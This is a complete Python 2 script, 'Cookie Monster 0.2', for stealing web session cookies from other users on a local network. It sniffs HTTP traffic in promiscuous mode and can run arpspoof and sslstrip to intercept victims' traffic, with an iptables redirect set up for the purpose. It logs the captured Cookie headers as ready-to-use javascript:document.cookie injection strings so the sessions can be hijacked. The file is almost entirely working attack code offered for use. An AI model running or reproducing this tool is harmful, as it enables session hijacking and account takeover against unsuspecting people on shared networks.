#!/usr/bin/env python
# Cookie Monster version 0.2
# - written by opt1@eigrp.co

from socket import *
import struct, sys, time, subprocess, signal, thread, fcntl, os

target_list = []

class iWantCookies():
    def __init__(self):
        self.option = ''
        self.outopt = ''

    def logo(self):
        print """
------------------------------------------------------------------------------
              _  _                                         [CookieMonster 0.2]
            _/O\/ \_                                                 [by opt1]
   .-.   .-` \_/\O/ `-.
  /:::\ / ,_________,  \ 
 /\:::/ \  `. (:::/  `.-;
 \ `-'`\ '._ `"'"'\__,   \ 
  `'-.  \   `)-=-=(   ;   | 
      \  `-"'      `"'    /                       Me like cookies! nom nom nom
------------------------------------------------------------------------------"""
        print '\n\n'

def arp_boss(target_ip, gateway):
    if target_ip not in target_list:
        target_list.append(target_ip)
        thread.start_new_thread(arpspoof,(target_ip, gateway))

def arp_ip_check(ip, source_ip, dest_ip, subnet):
    if subnet == '100': # a class
        thisip = ip.split('.')[:1]
        sip = source_ip.split('.')[:1]
        dip = dest_ip.split('.')[:1]
    elif subnet == '101': # b class
        thisip = ip.split('.')[:2]
        sip = source_ip.split('.')[:2]
        dip = dest_ip.split('.')[:2]
    else: # c class
        thisip = ip.split('.')[:3]
        sip = source_ip.split('.')[:3]
        dip = dest_ip.split('.')[:3]
    if thisip == sip:
        return source_ip
    if thisip == dip:
        return dest_ip

def subnet_check(netmask):
    netmasks = {'255.0.0.0':100, '255.255.0.0':101, '255.255.255.0':102}
    for item in netmasks:
        if item == netmask:
            return netmasks[item]

def sslstrip(filename):
    subprocess.call(['sslstrip', '-w', filename, '-k'])

def sslstrip_configure(ip_forward):
    file2 = open("/proc/sys/net/ipv4/ip_forward", 'w')
    file2.write(ip_forward)
    file2.close()
    subprocess.call(['iptables', '-F'])
    subprocess.call(['iptables', '-X'])
    subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '10000'])

def inter_promisc(promisc):
    subprocess.call(['ifconfig', interface, promisc])

def signal_shutdown(signum, frame):
    print '\n\nSignal Interupt Caught.\nTaking {0} out of promisc mode\n'.format(interface)
    inter_promisc("-promisc")
    sslstrip_configure('0')
    sys.exit(0)

def arpspoof(ip, gateway):
    subprocess.call(['arpspoof', '-i', interface, '-t', ip, gateway])

def cookiedump(data):
    data = str(data)
    restr = ""
    for item in data:
        asciiHex = ord(item)
        if (asciiHex < 32) or (asciiHex >= 127):
            restr=restr+"*"
        else:
            restr = restr+item
    return restr

def cookiecheck(data):
    if 'Cookie' in data:
        return 'cookie'
    else:
        return False

def cookie_monster(packet, ip, netmask, ix):
    try:
        appData = packet[0][54:]
        tcpHeader = packet[0][34:54]
        ipHdr = packet[0][14:34]
        tcp_header = struct.unpack("!HH16s", tcpHeader)
        sport = tcp_header[0]
        dport = tcp_header[1]
        ip_header = struct.unpack("!12s4s4s", ipHdr)
        source_ip = inet_ntoa(ip_header[1])
        dest_ip = inet_ntoa(ip_header[2])

        if ix.option == '-s':
            subnet = subnet_check(netmask)
            target_ip  = arp_ip_check(ip, source_ip, dest_ip, subnet)
            arp_boss(target_ip, get_gateway())

        data = str(cookiedump(appData))
        if (cookiecheck(data) == 'cookie'):
            cookiewrite(data, source_ip, sport, dest_ip, dport, ix)
    except Exception, error:
        print str(error)

def cookiewrite(data, source_ip, sport, dest_ip, dport, ix):
    try:
        javascript = []
        cookie = data.split("Cookie:")[1:]
        host = data.split("Host:")[1:]
        cookie = cookie[0].split(';')
        file2 = open('cookie.log', 'a')

        if ix.outopt == '-2':
            for item in cookie:
                item = item.strip(' ')
                item = rmstar(item)
                restr = 'void(document.cookie="'+item+'")'
                javascript.append(restr)
            javascript = str(';'.join(javascript))
            javaman = 'javascript:'+str(javascript)+';\n\n'
        elif ix.outopt == '-1':
            javascript = str(';'.join(cookie))
            javaman = 'Cookies:\n'+str(javascript)+'\n\n'
            javaman = rmstar(javaman)
        host = host[0].split('*')[:1]
        host = time.ctime()+'\n'+str(host)+'\nSource: ['+str(source_ip)+":"+str(sport)+'] Destination: ['+str(dest_ip)+':'+str(dport)+']\n'
        file2.write(host)
        file2.write(javaman)
    except Exception, error:
        pass

def rmstar(item):
    restr = ''
    for char in item:
        if '*' in char:
            pass
        else:
            restr = restr+char
    return restr

def usage(pname, ix):
    print ix.logo()
    print """Usage: {0} <option> <interface>

    Options:

    <Interfaces>
        eth#/wlan#  Will put this interface into promisc mode.

    <Options> (Have to choose one)
        -c          Default mode Promisc mode snag cookies
        -s          Automated sslstrip / arpspoof attack

    <Output Options> (Have to choose one)
        -1          output for greasemonkey cookie injector
        -2          javascript code for Url address bar injection

Most people will want to start with: 
{1} -c -1 wlan0

""".format(pname, pname)
    exit(0)

def get_gateway():
    s = "ip route list dev "+ interface + " | awk ' /^default/ {print $3}'"
    stdin, stdout = os.popen4(s)
    return stdout.read()

def main():
    ix = iWantCookies()

    if len(sys.argv) < 4:
        usage(sys.argv[0], ix)
    if ('-s' in sys.argv[1]) or ('-c' in sys.argv[1]) or ('-1' in sys.argv[2]) or ('2' in sys.argv[2]):
        pass
    else:
        usage(sys.argv[0], ix)
    ix.option = sys.argv[1]
    ix.outopt = sys.argv[2]
    ix.logo()

    global interface
    global target_list
    interface = sys.argv[3]
    inter_promisc("promisc")

    if ix.option == '-s':
        sslstrip_configure('1')
        thread.start_new_thread(sslstrip,("sslstrip.log",))
    signal.signal(signal.SIGINT, signal_shutdown)
    print '\n\nCookie Monster 0.2 by Opt1 running...'
    try:
        rawsock = socket(PF_PACKET, SOCK_RAW, htons(0x0800))
        while True:
            pack = ''
            nextPacket = 0
            while nextPacket == 0:
                    pack = rawsock.recvfrom(2048)
                    tcpHeader = pack[0][34:54]
                    try:
                        tcp_hdr = struct.unpack("!HH16s", tcpHeader)
                        source_port = tcp_hdr[0]
                        dest_port = tcp_hdr[1]
                        if (source_port == 80) or (source_port == 443) or (dest_port == 80) or (dest_port == 443):
                            nextPacket = 1
                    except:
                        pass
                    netmask = inet_ntoa(fcntl.ioctl(rawsock.fileno(), 0x891b, struct.pack('256s',interface))[20:24])
                    ip = inet_ntoa(fcntl.ioctl(rawsock.fileno(), 0x8915, struct.pack('256s',interface[:15]))[20:24])
            cookie_monster(pack, ip, netmask, ix)
    except Exception, error:
        error = str(error)
        print "\n"+error+"\n"

if __name__ == "__main__":
    main()
